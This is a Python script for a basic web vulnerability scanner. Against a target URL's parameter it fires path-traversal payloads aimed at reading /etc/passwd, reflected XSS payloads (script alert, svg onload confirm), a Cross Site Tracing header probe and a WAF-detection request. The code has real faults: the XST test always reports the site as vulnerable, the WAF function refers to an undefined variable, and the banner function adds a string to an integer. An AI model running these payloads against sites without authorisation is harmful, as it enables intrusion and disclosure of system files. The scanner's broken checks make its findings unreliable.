
#What will be scanned.
#xss
#sql
#lfi
#xst
#waf

import requests
import sys
import time

def xst_(url):
    # print("\n[!] Testing XST")
    headers = {"Test":"Hello_Word"}
    req = requests.get(url, headers=headers)
    head = req.headers
    if "Test" or "test" in head:
        print("[*] This site seems vulnerable to Cross Site Tracing (XST)!")
        return "[*] This site seems vulnerable to Cross Site Tracing (XST)!"
    else:
        print("[!] XST failed!")
        return "[!] XST failed!"

def lfi_(url):
    # print("\n[!] Testing LFI")
    p3=[]
    payloads = ['../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd']
    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pay in payloads:
        uur = urlt + pay
        req = requests.get(uur).text
        if "root:x:0:0" in req:
            print("[*] Payload found.")
            # p1.append("[*] Payload found.")
            print("[!] Payload:",pay)
            # p2.append("[!] Payload:"+pay)
            print("[!] POCS",uur)
            p3.append('[*] Payload found. [!] Payload:'+pay+' ,[!] POC:'+uur)
        else:
            p3.append('Not Found')
            pass
    return p3
def xss_(url):
    p1 = []
    p2 = []
    p3 = []
    paydone = []
    payloads = ['injectest','/inject','//inject//','<inject','(inject','"inject','<script>alert("inject")</script>']
    # print("[!] Testing XSS")
    # print("[!] 10 Payloads.")

    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pl in payloads:
        urlte = urlt + pl
        re = requests.get(urlte).text
        if pl in re:
            paydone.append(pl)
        else:
            pass
    url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
    req1 = requests.get(url1).text
    if "'>inject<svg/onload=confirm(/inject/)>web" in req1:
        paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
    else:
        pass

    url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req2 = requests.get(url2).text
    if '<script>alert("inject")</script>' in req2:
        paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req3 = requests.get(url3).text
    if '<script>alert("inject")</script>' in req3:
        paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    if len(paydone) == 0:
        print("[!] Was not possible to exploit XSS.")
        return "[!] Was not possible to exploit XSS."
    else:

        print("[+]",len(paydone),"Payloads were found.")
        l="[+]",len(paydone),"Payloads were found."
        for p in paydone:
            print("\n[*] Payload found!")

            print("[!] Payload:",p)

            print("[!] POC:",urlt+p)
            p1.append("[*] Payload found!,[!] Payload:"+p+",[!] POC:%s" +(urlt+p))
    return p1


def checkwaf(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with statu code:", sc.status_code)
            return "[!] Error with statu code:", sc.status_code
    except:
        print("[!] Error with the first request.")
        return "[!] Error with the first request."
        exit()
    r = requests.get(url)

    opt = ["Yes","yes","Y","y"]
    try:
        if r.headers["server"] == "cloudflare":
            print("[\033[1;31m!\033[0;0m]The Server is Behind a CloudFlare Server.")
            # ex = input("[\033[1;31m!\033[0;0m]Exit y/n: ")
            if ex in opt:
                exit("[\033[1;33m!\033[0;0m] - Quitting")
            return "[\033[1;31m!\033[0;0m]The Server is Behind a CloudFlare Server."
    except:
        pass

    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    waffd = requests.get(fuzz)
    if waffd.status_code == 406 or waffd.status_code == 501:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    if waffd.status_code == 999:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    if waffd.status_code == 419:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    if waffd.status_code == 403:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    else:
        print("[*] No WAF Detected.")
        return "[*] No WAF Detected."

def banner(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with statu code:",sc.status_code)
            return "[!] Error with statu code:"+sc.status_code
    except:
        print("[!] Error with the first request.")
        exit()
        return "[!] Error with the first request."


    print("""----Target: {}""".format(url))
    return """----Target: {}""".format(url)
# def help():
#     print("""
#
#
#     error try different website
#     python3 xss.py http://example.com/page.php?id=value
#     """)
#     exit()
#
# try:
#     arvs = sys.argv
#     url = arvs[1]
# except:
#     help()
#
# if 'http' not in url:
#     help()
# if '?' not in url:
#     help()
#
# timing1 = time.time()
# checkwaf(url)
# banner(url)
# xss_(url)
# lfi_(url)
# xst_(url)
# timing2 = time.time()
# timet = timing2 - timing1
# timet = str(timet)
# timet = timet.split(".")
# print("\n[!] Time used:",timet[0],"seconds.\n")